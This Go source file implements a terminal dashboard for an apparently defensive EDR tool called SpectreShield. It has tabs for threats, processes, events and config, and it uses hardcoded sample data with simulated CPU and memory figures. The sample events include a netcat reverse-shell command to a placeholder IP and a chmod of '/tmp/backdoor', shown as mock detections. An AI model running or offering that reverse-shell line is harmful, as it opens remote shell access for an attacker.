//go:build linux

package tui

import (
	"fmt"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

var (
	titleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FAFAFA")).
			Background(lipgloss.Color("#7D56F4")).
			Padding(0, 1).
			Bold(true)

	statusBarStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#A0A0A0")).
			Background(lipgloss.Color("#2D2D2D")).
			Padding(0, 1)

	threatHighStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FF4444")).
			Bold(true)

	threatMedStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FFAA00"))

	threatLowStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#44FF44"))

	normalStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#CCCCCC"))

	headerStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#7D56F4")).
			Bold(true)

	graphStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#00BFFF"))
)

// Model is the Bubble Tea model
type Model struct {
	width       int
	height      int
	ready       bool
	currentTab  int
	tabs        []string
	uptime      time.Duration
	eventsTotal uint64
	threatsTotal uint64
	activePIDs  int
	cpuUsage    float64
	memUsage    float64
	ringBufUsed float64
	threats     []ThreatEntry
	processes   []ProcessEntry
	events      []EventEntry
	selectedRow int
	quitting    bool
}

type ThreatEntry struct {
	ID       string
	Time     string
	Category string
	Severity string
	PID      uint32
	Comm     string
	Status   string
}

type ProcessEntry struct {
	PID    uint32
	PPID   uint32
	Comm   string
	UID    uint32
	Status string
}

type EventEntry struct {
	Time    string
	Type    string
	PID     uint32
	Comm    string
	Detail  string
}

type tickMsg struct{}
type loadDataMsg struct{}

// NewModel creates a new TUI model
func NewModel() Model {
	return Model{
		tabs:       []string{"Overview", "Threats", "Processes", "Events", "Config"},
		currentTab: 0,
		threats: []ThreatEntry{
			{ID: "t-001", Time: "13:42:01", Category: "c2_callback", Severity: "HIGH", PID: 1234, Comm: "nc", Status: "BLOCKED"},
			{ID: "t-002", Time: "13:41:45", Category: "privilege_escalation", Severity: "CRITICAL", PID: 5678, Comm: "bash", Status: "CONTAINED"},
			{ID: "t-003", Time: "13:40:12", Category: "reverse_shell", Severity: "HIGH", PID: 9012, Comm: "python3", Status: "ANALYZING"},
		},
		processes: []ProcessEntry{
			{PID: 1, PPID: 0, Comm: "systemd", UID: 0, Status: "normal"},
			{PID: 1234, PPID: 100, Comm: "nc", UID: 1000, Status: "SUSPICIOUS"},
			{PID: 5678, PPID: 1, Comm: "bash", UID: 0, Status: "FROZEN"},
		},
		events: []EventEntry{
			{Time: "13:42:01", Type: "exec", PID: 1234, Comm: "nc", Detail: "/bin/nc -e /bin/sh 1.2.3.4 4444"},
			{Time: "13:41:45", Type: "connect", PID: 5678, Comm: "bash", Detail: "1.2.3.4:4444"},
			{Time: "13:40:12", Type: "chmod", PID: 9012, Comm: "python3", Detail: "/tmp/backdoor 0755"},
		},
	}
}

// Init implements tea.Model
func (m Model) Init() tea.Cmd {
	return tea.Batch(
		tea.EnterAltScreen,
		tickCmd(),
		loadDataCmd(),
	)
}

// Update implements tea.Model
func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		m.ready = true
		return m, nil

	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			m.quitting = true
			return m, tea.Quit

		case "tab", "right":
			m.currentTab = (m.currentTab + 1) % len(m.tabs)
			m.selectedRow = 0
			return m, nil

		case "shift+tab", "left":
			m.currentTab = (m.currentTab - 1 + len(m.tabs)) % len(m.tabs)
			m.selectedRow = 0
			return m, nil

		case "up", "k":
			if m.selectedRow > 0 {
				m.selectedRow--
			}
			return m, nil

		case "down", "j":
			maxRow := m.getMaxRow()
			if m.selectedRow < maxRow-1 {
				m.selectedRow++
			}
			return m, nil

		case "1":
			m.currentTab = 0
			return m, nil
		case "2":
			m.currentTab = 1
			return m, nil
		case "3":
			m.currentTab = 2
			return m, nil
		case "4":
			m.currentTab = 3
			return m, nil
		case "5":
			m.currentTab = 4
			return m, nil

		case "b":
			if m.currentTab == 1 && m.selectedRow < len(m.threats) {
				m.threats[m.selectedRow].Status = "BLOCKED"
			}
			return m, nil

		case "f":
			if m.currentTab == 2 && m.selectedRow < len(m.processes) {
				m.processes[m.selectedRow].Status = "FROZEN"
			}
			return m, nil

		case "enter":
			return m, nil
		}

	case tickMsg:
		m.uptime += time.Second
		m.eventsTotal += uint64(100 + m.activePIDs)
		m.cpuUsage = 2.5 + float64(m.activePIDs)*0.1
		m.memUsage = 15.3 + float64(len(m.threats))*0.5
		m.ringBufUsed = float64(len(m.events)) * 2.3
		return m, tickCmd()

	case loadDataMsg:
		return m, loadDataCmd()
	}

	return m, nil
}

// View implements tea.Model
func (m Model) View() string {
	if m.quitting {
		return "SpectreShield shutting down...\n"
	}

	if !m.ready {
		return "Initializing SpectreShield TUI..."
	}

	var b strings.Builder

	// Title bar
	title := titleStyle.Render(" SpectreShield EDR Dashboard ")
	b.WriteString(title)
	b.WriteString("\n")

	// Tab bar
	for i, tab := range m.tabs {
		if i == m.currentTab {
			b.WriteString(lipgloss.NewStyle().
				Foreground(lipgloss.Color("#7D56F4")).
				Bold(true).
				Render(fmt.Sprintf(" [%s] ", tab)))
		} else {
			b.WriteString(normalStyle.Render(fmt.Sprintf("  %s  ", tab)))
		}
	}
	b.WriteString("\n")
	b.WriteString(strings.Repeat("─", m.width))
	b.WriteString("\n")

	// Content
	switch m.currentTab {
	case 0:
		b.WriteString(m.renderOverview())
	case 1:
		b.WriteString(m.renderThreats())
	case 2:
		b.WriteString(m.renderProcesses())
	case 3:
		b.WriteString(m.renderEvents())
	case 4:
		b.WriteString(m.renderConfig())
	}

	// Status bar
	b.WriteString(strings.Repeat("─", m.width))
	b.WriteString("\n")
	status := fmt.Sprintf(" ↑↓ Navigate | Tab Switch | b Block | f Freeze | q Quit | Events: %d | Threats: %d ",
		m.eventsTotal, m.threatsTotal)
	b.WriteString(statusBarStyle.Render(status))

	return b.String()
}

func (m Model) renderOverview() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("System Status"))
	b.WriteString("\n\n")

	// Stats grid
	cpuBar := m.renderBar(int(m.cpuUsage), 100, 20)
	memBar := m.renderBar(int(m.memUsage), 100, 20)
	ringBar := m.renderBar(int(m.ringBufUsed), 100, 20)

	b.WriteString(fmt.Sprintf("  Uptime:      %s\n", m.uptime.Truncate(time.Second)))
	b.WriteString(fmt.Sprintf("  Events:      %d\n", m.eventsTotal))
	b.WriteString(fmt.Sprintf("  Threats:     %d\n", m.threatsTotal))
	b.WriteString(fmt.Sprintf("  Active PIDs: %d\n", m.activePIDs))
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  CPU:         %s %.1f%%\n", cpuBar, m.cpuUsage))
	b.WriteString(fmt.Sprintf("  Memory:      %s %.1f%%\n", memBar, m.memUsage))
	b.WriteString(fmt.Sprintf("  Ring Buffer: %s %.1f%%\n", ringBar, m.ringBufUsed))
	b.WriteString("\n")

	// Mini threat list
	b.WriteString(headerStyle.Render("Recent Threats"))
	b.WriteString("\n")
	for i, t := range m.threats {
		if i >= 3 {
			break
		}
		style := threatLowStyle
		if t.Severity == "HIGH" || t.Severity == "CRITICAL" {
			style = threatHighStyle
		} else if t.Severity == "MEDIUM" {
			style = threatMedStyle
		}
		b.WriteString(fmt.Sprintf("  %s %s [%s] PID %d %s\n",
			style.Render(t.Severity), t.Category, t.Time, t.PID, t.Comm))
	}

	return b.String()
}

func (m Model) renderThreats() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("Threats"))
	b.WriteString("\n\n")

	// Header
	b.WriteString(fmt.Sprintf("  %-6s %-8s %-25s %-10s %-8s %-12s %-10s\n",
		"ID", "TIME", "CATEGORY", "SEVERITY", "PID", "COMM", "STATUS"))
	b.WriteString(strings.Repeat("─", m.width-4))
	b.WriteString("\n")

	// Rows
	for i, t := range m.threats {
		style := normalStyle
		if i == m.selectedRow {
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("#7D56F4")).Bold(true)
		}

		statusStyle := normalStyle
		if t.Status == "BLOCKED" {
			statusStyle = threatHighStyle
		} else if t.Status == "CONTAINED" {
			statusStyle = threatMedStyle
		}

		b.WriteString(style.Render(fmt.Sprintf("  %-6s %-8s %-25s %-10s %-8d %-12s ",
			t.ID, t.Time, t.Category, t.Severity, t.PID, t.Comm)))
		b.WriteString(statusStyle.Render(t.Status))
		b.WriteString("\n")
	}

	b.WriteString("\n")
	b.WriteString(statusBarStyle.Render(" [b] Block  [f] Freeze  [enter] Details "))
	return b.String()
}

func (m Model) renderProcesses() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("Process Tree"))
	b.WriteString("\n\n")

	b.WriteString(fmt.Sprintf("  %-8s %-8s %-16s %-8s %-12s\n",
		"PID", "PPID", "COMM", "UID", "STATUS"))
	b.WriteString(strings.Repeat("─", m.width-4))
	b.WriteString("\n")

	for i, p := range m.processes {
		style := normalStyle
		if i == m.selectedRow {
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("#7D56F4")).Bold(true)
		}

		statusStyle := normalStyle
		if p.Status == "SUSPICIOUS" {
			statusStyle = threatHighStyle
		} else if p.Status == "FROZEN" {
			statusStyle = threatMedStyle
		}

		b.WriteString(style.Render(fmt.Sprintf("  %-8d %-8d %-16s %-8d ",
			p.PID, p.PPID, p.Comm, p.UID)))
		b.WriteString(statusStyle.Render(p.Status))
		b.WriteString("\n")
	}

	return b.String()
}

func (m Model) renderEvents() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("Event Stream"))
	b.WriteString("\n\n")

	b.WriteString(fmt.Sprintf("  %-8s %-10s %-8s %-16s %s\n",
		"TIME", "TYPE", "PID", "COMM", "DETAIL"))
	b.WriteString(strings.Repeat("─", m.width-4))
	b.WriteString("\n")

	for _, e := range m.events {
		typeStyle := normalStyle
		switch e.Type {
		case "exec":
			typeStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("#00BFFF"))
		case "connect":
			typeStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("#FF6B6B"))
		case "chmod":
			typeStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("#FFD93D"))
		}

		b.WriteString(fmt.Sprintf("  %-8s ", e.Time))
		b.WriteString(typeStyle.Render(fmt.Sprintf("%-10s", e.Type)))
		b.WriteString(fmt.Sprintf(" %-8d %-16s %s\n", e.PID, e.Comm, e.Detail))
	}

	return b.String()
}

func (m Model) renderConfig() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("Configuration"))
	b.WriteString("\n\n")

	b.WriteString("  eBPF Programs:\n")
	b.WriteString("    process_monitor.o   [LOADED]\n")
	b.WriteString("    network_monitor.o   [LOADED]\n")
	b.WriteString("    file_monitor.o      [LOADED]\n\n")

	b.WriteString("  Hermes Bridge:\n")
	b.WriteString("    Endpoint:  http://localhost:8765\n")
	b.WriteString("    Status:    CONNECTED\n")
	b.WriteString("    Model:     deepseek-r1:1.5b\n\n")

	b.WriteString("  Forensics:\n")
	b.WriteString("    Dump Dir:  /var/lib/spectreshield/dumps\n")
	b.WriteString("    Max Dumps: 100\n\n")

	b.WriteString("  Sandbox:\n")
	b.WriteString("    Enabled:   true\n")
	b.WriteString("    Timeout:   30s\n")
	b.WriteString("    Network:   isolated\n")

	return b.String()
}

func (m Model) renderBar(value, max, width int) string {
	filled := int(float64(width) * float64(value) / float64(max))
	empty := width - filled

	bar := strings.Repeat("█", filled) + strings.Repeat("░", empty)
	return graphStyle.Render(bar)
}

func (m Model) getMaxRow() int {
	switch m.currentTab {
	case 1:
		return len(m.threats)
	case 2:
		return len(m.processes)
	case 3:
		return len(m.events)
	default:
		return 0
	}
}

func tickCmd() tea.Cmd {
	return tea.Tick(time.Second, func(t time.Time) tea.Msg {
		return tickMsg{}
	})
}

func loadDataCmd() tea.Cmd {
	return tea.Tick(5*time.Second, func(t time.Time) tea.Msg {
		return loadDataMsg{}
	})
}

// Run starts the TUI
func Run() error {
	p := tea.NewProgram(
		NewModel(),
		tea.WithAltScreen(),
		tea.WithMouseCellMotion(),
	)

	_, err := p.Run()
	return err
}
